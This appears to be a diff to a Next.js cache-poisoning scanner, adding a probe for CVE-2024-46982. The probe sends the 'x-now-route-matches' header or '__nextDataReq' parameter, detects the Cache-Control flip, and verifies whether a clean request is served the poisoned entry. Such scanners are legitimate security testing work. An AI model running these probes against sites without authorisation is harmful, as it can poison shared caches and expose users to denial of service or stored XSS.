@@ -13,9 +13,12 @@ CVEs covered:
 - CVE-2026-44574: nxtP/nxtI parameter injection
 - CVE-2026-44579: next-resume header injection
 - CVE-2026-44581: CSP nonce reflection via cache
+- CVE-2024-46982: internal cache poisoning via SSR -> SSG misclassification
+  (x-now-route-matches / __nextDataReq)
 
 References:
 - https://github.com/dwisiswant0/next-16.2.4-pocs
+- https://zhero-web-sec.github.io/research-and-things/nextjs-cache-and-chains-the-stale-elixir
 """
 
 import re
@@ -54,6 +57,7 @@ class NextJsPoisoner:
             self._csp_nonce_reflection,
             self._rsc_hash_collision_probe,
             self._i18n_data_route_bypass,
+            self._internal_ssr_to_ssg_poison,
         ]
 
         tasks = [asyncio.create_task(t(client)) for t in techniques]
@@ -627,6 +631,150 @@ class NextJsPoisoner:
             normal_status=normal_status,
             sensitive_fields=[m[0] or m[1] or m[2] or m[3] for m in sensitive_matches][:5],
             cache_evidence=evidence,
+        )
+
+    async def _internal_ssr_to_ssg_poison(self, client: HttpClient) -> List[Dict]:
+        """
+        CVE-2024-46982: internal cache poisoning via SSR -> SSG misclassification.
+
+        Next.js 13.5.1 - 14.2.9 on the pages router classify a request carrying the
+        Vercel-internal ``x-now-route-matches`` header as a static (SSG) render even
+        when the route is server-side rendered. The give-away is externally visible:
+        the response Cache-Control flips from
+
+            private, no-cache, no-store, max-age=0, must-revalidate
+
+        to
+
+            s-maxage=1, stale-while-revalidate
+
+        i.e. from "never store this" to "shared caches may store and re-serve this".
+        A response that was meant to be per-user then lands in a shared cache, which
+        is a DoS when JSON replaces HTML and stored XSS when getServerSideProps
+        reflects request data.
+
+        The ``__nextDataReq`` query parameter reaches the same code path and was
+        explicitly *not* covered by the CVE, so it remains unpatched -- it is probed
+        separately and reported even on patched builds.
+        """
+        findings = []
+
+        control = await control_probe(client, self.baseline.url, self.safe_headers)
+        if not control:
+            return []
+        _, control_resp = control
+
+        # The technique only means anything on a route the origin says must not be
+        # stored. If the route is already cacheable there is nothing to flip.
+        control_cc = self._cache_control(control_resp)
+        if self._is_cacheable_cc(control_cc):
+            return []
+
+        for label, extra_headers, extra_params, cve, unpatched in (
+            ("x-now-route-matches", {"x-now-route-matches": "1"}, {}, "CVE-2024-46982", False),
+            ("__nextDataReq", {}, {"__nextDataReq": "1"}, None, True),
+        ):
+            finding = await self._probe_ssg_flip(
+                client, label, extra_headers, extra_params, cve, unpatched, control_cc
+            )
+            if finding:
+                findings.append(finding)
+
+        return findings
+
+    async def _probe_ssg_flip(
+        self,
+        client: HttpClient,
+        label: str,
+        extra_headers: Dict[str, str],
+        extra_params: Dict[str, str],
+        cve: Optional[str],
+        unpatched: bool,
+        control_cc: str,
+    ) -> Optional[Dict]:
+        cb_name, cb_value = new_cb()
+        target_url = add_cb(self.baseline.url, cb_name, cb_value)
+        for key, value in extra_params.items():
+            target_url = add_cb(target_url, key, value)
+
+        probe_resp = await client.request(
+            "GET", target_url, headers={**self.safe_headers, **extra_headers}
+        )
+        if not probe_resp:
+            return None
+
+        probe_cc = self._cache_control(probe_resp)
+        if not self._is_cacheable_cc(probe_cc):
+            return None
+
+        # The flip alone is the misclassification. Whether it is *exploitable*
+        # depends on the clean request picking the entry back up.
+        verify_resp = await client.request("GET", target_url, headers=self.safe_headers)
+        if not verify_resp:
+            return None
+
+        probe_hash = stable_hash(probe_resp.get("body", b""), cb_value)
+        verify_hash = stable_hash(verify_resp.get("body", b""), cb_value)
+        is_hit, evidence = CacheGuard.cache_hit_signal(verify_resp)
+        poisoned = verify_hash == probe_hash and self._is_cacheable_cc(
+            self._cache_control(verify_resp)
+        )
+
+        if poisoned:
+            severity = "CRITICAL" if is_hit else "HIGH"
+            outcome = (
+                "Clean request re-served the SSG-classified response"
+                f"{' from cache' if is_hit else ''}."
+            )
+        else:
+            severity = "MEDIUM"
+            outcome = (
+                "Clean request did not re-serve it, so the misclassification is "
+                "confirmed but poisoning is not."
+            )
+
+        note = (
+            " This vector was not covered by CVE-2024-46982 and remains unpatched."
+            if unpatched
+            else ""
+        )
+
+        return self._make_finding(
+            "NextJS-InternalCachePoisoning",
+            severity,
+            f"{cve + ': ' if cve else ''}{label} flipped Cache-Control from "
+            f"{control_cc!r} to {probe_cc!r}, turning a server-rendered response "
+            f"into a shared-cacheable one. {outcome}{note}",
+            {
+                "name": f"NextJS-Internal-{label}",
+                "header": next(iter(extra_headers), None),
+                "value": next(iter(extra_headers.values()), None) or extra_params,
+                "type": "internal_cache",
+            },
+            target_url,
+            cve=cve,
+            cache_hit=is_hit,
+            cache_evidence=evidence,
+            probe_cache_control=probe_cc,
+        )
+
+    @staticmethod
+    def _cache_control(resp: Dict) -> str:
+        headers = resp.get("headers", {}) if resp else {}
+        for key, value in headers.items():
+            if key.lower() == "cache-control":
+                return str(value).lower()
+        return ""
+
+    @staticmethod
+    def _is_cacheable_cc(cache_control: str) -> bool:
+        """True when a shared cache is permitted to store and re-serve."""
+        if not cache_control:
+            return False
+        if any(token in cache_control for token in ("no-store", "private")):
+            return False
+        return any(
+            token in cache_control for token in ("s-maxage", "stale-while-revalidate")
         )
 
     def _add_cb(self, url: str, cb: str) -> str:
